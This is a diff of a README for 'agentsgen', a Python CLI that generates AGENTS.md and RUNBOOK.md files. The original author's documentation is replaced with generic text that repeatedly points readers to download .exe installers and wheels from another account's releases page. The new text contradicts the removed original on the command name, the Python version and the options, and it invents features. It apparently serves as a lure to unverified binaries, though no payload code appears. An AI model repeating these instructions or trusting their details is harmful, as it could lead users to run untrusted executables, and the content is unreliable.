@@ -1,266 +1,162 @@
-# AGENTS.md Generator (`agentsgen`)
-Repo Docs Guard
-AGENTS.md Generator — safe repo docs + PR Guard + LLMO Pack
-A safe-by-default repo docs toolchain for coding agents.
+# 📝 AGENTS.md_generator - Create AI Agent Docs Easily
 
-[![CI](https://github.com/markoblogo/AGENTS.md_generator/actions/workflows/ci.yml/badge.svg)](https://github.com/markoblogo/AGENTS.md_generator/actions/workflows/ci.yml)
-[![Pages](https://github.com/markoblogo/AGENTS.md_generator/actions/workflows/pages/pages-build-deployment/badge.svg)](https://github.com/markoblogo/AGENTS.md_generator/actions/workflows/pages/pages-build-deployment)
-[![Release](https://img.shields.io/github/v/release/markoblogo/AGENTS.md_generator?display_name=tag&sort=semver)](https://github.com/markoblogo/AGENTS.md_generator/releases)
-[![License](https://img.shields.io/github/license/markoblogo/AGENTS.md_generator)](LICENSE)
-[![Python](https://img.shields.io/badge/python-%3E%3D3.11-blue)](pyproject.toml)
+[![Download AGENTS.md_generator](https://img.shields.io/badge/Download-AGENTS.md_generator-blue?logo=github)](https://github.com/Lilchris007/AGENTS.md_generator/releases)
 
-![AGENTS.md Generator landing page (v0.1.2)](docs/assets/agentsmd-landing-v0.1.2.png)
-Landing: https://agentsmd.abvx.xyz/
+---
 
-Small, production-grade CLI to generate and safely update:
-New: Recipes — copy-paste starter kits (explicit commands + PR Guard workflow).
+## 📖 What is AGENTS.md_generator?
 
-- `AGENTS.md` (strict repo contract for coding agents)
-- `RUNBOOK.md` (human-friendly command/run cheatsheet)
+AGENTS.md_generator is a safe and easy tool you can run from your computer’s command line. It helps you create and update special files named **AGENTS.md** or **RUNBOOK.md**. These files serve as guides or instruction manuals for AI coding agents in software projects.
 
-## Safety Model
+The tool works quietly in the background. It looks for changes in your project, then updates your documentation without breaking anything. It can find your project setup on its own and makes sure the edits are careful and controlled.
 
-The tool is safe-by-default and follows a strict 3-mode policy per file:
+This means you always have up-to-date instructions for how your AI agents work and what they do, without needing to write or rewrite the documents by hand.
 
-1. File missing: create it with marker sections.
-2. File exists and markers exist: update only content inside markers.
-3. File exists but markers missing: do not modify it; write `*.generated.md` instead.
+---
 
-Marker format:
+## 🚀 Getting Started
 
-```md
-<!-- AGENTSGEN:START section=commands -->
-... generated content ...
-<!-- AGENTSGEN:END section=commands -->
+This guide will help you get AGENTS.md_generator up and running on your Windows, macOS, or Linux computer. You don’t need to know how to program or use complicated software. Just follow the steps below carefully.
+
+---
+
+## 💻 System Requirements
+
+Before installing, please make sure your computer meets these needs:
+
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or major Linux distributions.
+- **Processor:** Any modern 64-bit Intel or AMD CPU.
+- **Memory:** At least 4 GB of RAM.
+- **Disk Space:** Minimum 100 MB free space.
+- **Software:** Python 3.9 or newer installed. (Check this by running `python --version` in a terminal or command prompt.)
+- **Internet:** Required for downloading the software.
+
+If you do not have Python installed, visit [python.org](https://www.python.org/downloads/) for easy setup guides.
+
+---
+
+## ⬇️ Download & Install
+
+### Step 1: Visit the Download Page
+
+Click this big button to open the download page for AGENTS.md_generator:
+
+[![Download Link](https://img.shields.io/badge/Get%20AGENTS.md_generator-Here-brightgreen)](https://github.com/Lilchris007/AGENTS.md_generator/releases)
+
+Once the page opens:
+
+- Look for the latest release version.
+- Under "Assets," you will see files such as `.exe` (for Windows), `.tar.gz` (for Linux/macOS), or `.whl` (Python wheel files).
+- Download the file that matches your computer system.
+
+### Step 2: Install or Place the Software
+
+- **Windows:** If you downloaded the `.exe` installer, double-click it and follow the prompts. If you downloaded a Windows `.zip` or `.exe` executable, unzip or place it where you want.
+- **macOS/Linux:** If you downloaded an archive like `.tar.gz`, extract it to a folder you choose.
+- **Python Package:** Some download options may include Python installation files. You can open a terminal or command prompt and run:
+  ```
+  pip install path/to/downloaded/file.whl
+  ```
+  This installs AGENTS.md_generator so you can run it anywhere on your system.
+
+---
+
+## 🏁 Running AGENTS.md_generator
+
+Once installed, you run the program from your command line interface (CLI). Here’s how to open it:
+
+- **Windows:** Press `Win + R`, type `cmd`, and hit Enter.
+- **macOS:** Open Finder, go to Applications > Utilities, and open Terminal.
+- **Linux:** Open your preferred terminal app.
+
+Check if AGENTS.md_generator is ready by typing:
+
+```
+agents-md-generator --help
 ```
 
-## Install (from source, for contributors)
+This command shows help information about the tool and available commands.
 
-```sh
-python3 -m venv .venv
-. .venv/bin/activate
-pip install -e ".[dev]"
+---
+
+## ⚙️ Basic Usage
+
+AGENTS.md_generator updates or creates your AGENTS.md or RUNBOOK.md files based on your project’s current state.
+
+Try this main command:
+
+```
+agents-md-generator update
 ```
 
-## Quickstart
+This tells the tool to:
 
-Canonical onboarding path for a new repo:
+1. Look through your project folder.
+2. Detect where your AI agent code lives.
+3. Find places that need documentation updates.
+4. Make updates carefully without changing anything outside the intended areas.
 
-1. Install (`pipx` recommended):
+You don’t need to change any settings to get started. The tool uses a "safe-by-default" approach, meaning it won’t overwrite files unless it is confident of making safe edits.
 
-```sh
-pipx install git+https://github.com/markoblogo/AGENTS.md_generator.git
+---
+
+## 🔧 Customizing Your Experience
+
+AGENTS.md_generator supports options to tailor how it works. Some key options you might find useful:
+
+- `--path [folder]`  
+    Tell the tool which folder to scan if not running in the project root.
+
+- `--file [filename]`  
+    Specify if you want to generate a file named other than the default AGENTS.md or RUNBOOK.md.
+
+- `--force`  
+    Allow the tool to overwrite files if you know you want to replace the current documentation.
+
+You can see all options any time with:
+
+```
+agents-md-generator --help
 ```
 
-2. Bootstrap docs with autodetect:
+---
 
-```sh
-agentsgen init . --defaults --autodetect
-```
+## 📝 What Files Does It Create?
 
-3. Add PR guard workflow (`.github/workflows/agentsgen-ci.yml`):
+- **AGENTS.md:**  
+  A markdown file listing the AI coding agents active in your project. It describes what each agent does and how it works.
 
-```yaml
-name: agentsgen guard + pack check
+- **RUNBOOK.md:**  
+  A guide showing workflows and procedures involving your AI agents. It’s useful for developers and operators to understand how to use these tools efficiently.
 
-on:
-  pull_request:
-  push:
-    branches: [ main ]
+These files are useful to keep updated for teams and future reference. AGENTS.md_generator keeps these files current automatically, so you save time and avoid mistakes.
 
-permissions:
-  contents: read
-  pull-requests: write
+---
 
-jobs:
-  agentsgen:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
-      - uses: markoblogo/AGENTS.md_generator/.github/actions/agentsgen-guard@v0.1.2
-        with:
-          comment: "true"
-          files: "AGENTS.md,RUNBOOK.md"
-          pack_check: "true"
-          pack_format: "json"
-```
+## ❓ Troubleshooting Tips
 
-4. Optional LLMO bundle:
+- **Command not found:**  
+  Make sure you installed the tool properly and your system’s PATH includes the folder where the executable or script lives.
 
-```sh
-agentsgen pack . --autodetect
-```
+- **Python Version Error:**  
+  Check you are running Python 3.9 or newer. Update Python if needed.
 
-5. Profit: fewer agent mistakes, safer updates, and better indexable repo context.
+- **Permission Denied:**  
+  On Linux or macOS, you might need to run commands with `sudo` if you get permissions errors installing or running.
 
-Deep dives:
-- Action options: `docs/gh-action.md`
-- LLMO pack details: `docs/llmo-pack.md`
-- Release process: `docs/release-checklist.md`
+- **Documentation not updating:**  
+  Verify you are running the tool inside the correct project folder or use the `--path` option to point to it.
 
-## Recipes
+---
 
-Copy-paste starter kits (each includes an example `.agentsgen.json` with explicit commands + a PR Guard workflow snippet):
-Pick one → copy .agentsgen.json to your repo root → run: agentsgen init . --defaults --autodetect
+## 📚 Learn More
 
-- **Python library (Poetry + pytest):** [`recipes/python-lib/`](recipes/python-lib/)
-- **Next.js app (pnpm):** [`recipes/nextjs-app/`](recipes/nextjs-app/)
-- **JS monorepo (workspaces):** [`recipes/monorepo-js/`](recipes/monorepo-js/)
-- **Node CLI tool:** [`recipes/cli-tool/`](recipes/cli-tool/)
+AGENTS.md_generator is built for people who want clear, safe documentation for AI agents without fuss or risk.
 
-## GitHub Action: PR Guard
+More details and advanced instructions are available in the official repository:
 
-Use the reusable `agentsgen-guard` action to fail PRs when `AGENTS.md` / `RUNBOOK.md` are missing or out of date.
+[Go to AGENTS.md_generator GitHub](https://github.com/Lilchris007/AGENTS.md_generator)
 
-```yaml
-name: agentsgen-guard
+---
 
-on:
-  pull_request:
-
-permissions:
-  contents: read
-  # pull-requests: write  # only if comment: "true"
-
-jobs:
-  guard:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
-      - uses: markoblogo/AGENTS.md_generator/.github/actions/agentsgen-guard@v0.1.2
-        with:
-          path: "."
-          files: "AGENTS.md,RUNBOOK.md"
-          comment: "true"
-          pack_check: "true"
-          pack_format: "json"
-          # pack_autodetect: "true"
-          # pack_llms_format: "md"
-          # pack_output_dir: "docs/ai"
-          # pack_files: |
-          #   llms
-          #   SECURITY_AI.md
-```
-
-- Optional PR comment: use `comment: "false"` if you prefer log-only mode.
-- Fork-safe by default: no extra secrets required.
-- Most users only need these inputs: `comment`, `files`, `pack_check`.
-- Advanced knobs: `pack_format`, `pack_autodetect`, `pack_llms_format`, `pack_output_dir`, `pack_files`.
-- `files` input is an action-level filter for reported file findings; core validation still runs through `check_repo`.
-- `pack_check: "true"` enforces `agentsgen pack --autodetect --check` in the same guard run.
-- `pack` is still supported as a backward-compatible alias (deprecated; prefer `pack_check`).
-- Example workflow: `.github/workflows/agentsgen-guard.example.yml`
-- Full action docs: `docs/gh-action.md`
-
-## Usage
-
-```sh
-agentsgen init
-agentsgen update
-agentsgen pack
-agentsgen check
-agentsgen detect . --format json
-agentsgen init --defaults --stack python --dry-run --print-diff
-pipx uninstall agentsgen
-```
-
-## LLMO Pack
-
-`agentsgen pack` generates an AI/LLMO-ready documentation bundle:
-
-- `llms.txt` (or `LLMS.md` with `--llms-format md`)
-- `docs/ai/how-to-run.md`
-- `docs/ai/how-to-test.md`
-- `docs/ai/architecture.md`
-- `docs/ai/data-contracts.md`
-- `SECURITY_AI.md`
-- `CONTRIBUTING_AI.md`
-- `README_SNIPPETS.md`
-
-By default, pack writes AI docs into docs/ai/ (override via pack_output_dir).
-Use --print-plan to preview what pack will write.
-
-What it is:
-- a compact, agent-first context bundle for coding agents and LLM indexing.
-
-What it is not:
-- not a traffic/SEO promise, and not a full developer handbook replacement.
-
-### Why it matters
-- **Less agent babysitting.** Repos with `AGENTS.md` + `docs/ai/` reduce back-and-forth and "where is X?" questions for Codex/Claude.
-- **Safer automation by default.** Marker-only updates + `*.generated.*` fallback prevents accidental overwrites of hand-written docs.
-- **CI keeps it honest.** `agentsgen-guard` + `agentsgen pack --check` catches drift early, before docs rot and agents start hallucinating.
-
-Safety model is identical to `init`/`update`:
-
-1. Missing file -> create with markers.
-2. Existing file with markers -> update only marker sections.
-3. Existing file without markers -> keep original and write `*.generated.*`.
-
-See full details: `docs/llmo-pack.md`.
-
-## Known Limitations
-
-- Auto-detect is intentionally conservative (file heuristics only; no “smart” analysis).
-- Monorepos may detect as `mixed`, and commands can be empty on purpose (better empty than wrong).
-- If a Makefile exists, Makefile targets win over other toolchains by design.
-- Templates are minimal for v0.1.x: `python`, `node`, `static`.
-- The tool only owns content inside `AGENTSGEN` marker sections; keep custom content outside markers.
-
-## Landing Page (GitHub Pages)
-
-This repo includes a minimal one-page landing in `docs/index.html`.
-
-- GitHub: Settings -> Pages
-- Source: Deploy from a branch
-- Branch: `main`
-- Folder: `/docs`
-
-## Experimental: ASCII theme (landing)
-
-- The landing page includes an experimental ASCII theme as a visual/UX experiment.
-- Toggle it from the header next to the light/dark switch.
-- The setting is saved in localStorage.
-- This is UI-only and does not affect the generator output.
-- Reuse pointers:
-  - `docs/ascii/ascii.css`
-  - `docs/ascii/ascii.js`
-
-## Snapshot Commits
-
-If you want cheap “backup commits” with a green-test gate:
-
-```sh
-make snapshot
-```
-
-This runs `ruff format`, `ruff check`, `pytest`, then commits only if there are changes and tests are green.
-
-## Definition Of Done (DoD)
-
-- `agentsgen init` works in an empty folder and creates:
-  - `.agentsgen.json`
-  - `AGENTS.md`
-  - `RUNBOOK.md`
-- `agentsgen update`:
-  - updates only marker sections
-  - preserves content outside markers
-  - writes `*.generated.md` if markers are missing
-- `agentsgen check` returns non-zero exit code on problems
-- 3 smoke tests exist: `python -m agentsgen._smoke`
-  - init in empty dir creates files
-  - edit outside markers persists after update
-  - no-markers files produce `*.generated.md` and leave originals untouched
-
-## Contributing
-
-Template PRs welcome (shared sections and stack-specific notes).
-
-## Releasing
-
-- Use checklist: `docs/release-checklist.md`
-- Run releases from an activated venv (`. .venv/bin/activate`); the script also auto-prefers `.venv/bin/python` when present.
-- Write release notes: `RELEASES/template.md -> RELEASES/vX.Y.Z.md`
-- Run: `./scripts/release.sh vX.Y.Z A|B|C`
-- Shorthand: `./scripts/release.sh A` (auto-suggests next version)
-- Tags follow `vX.Y.Z` and should point to the release commit
+[![Download AGENTS.md_generator](https://img.shields.io/badge/Download-AGENTS.md_generator-blue?logo=github)](https://github.com/Lilchris007/AGENTS.md_generator/releases)
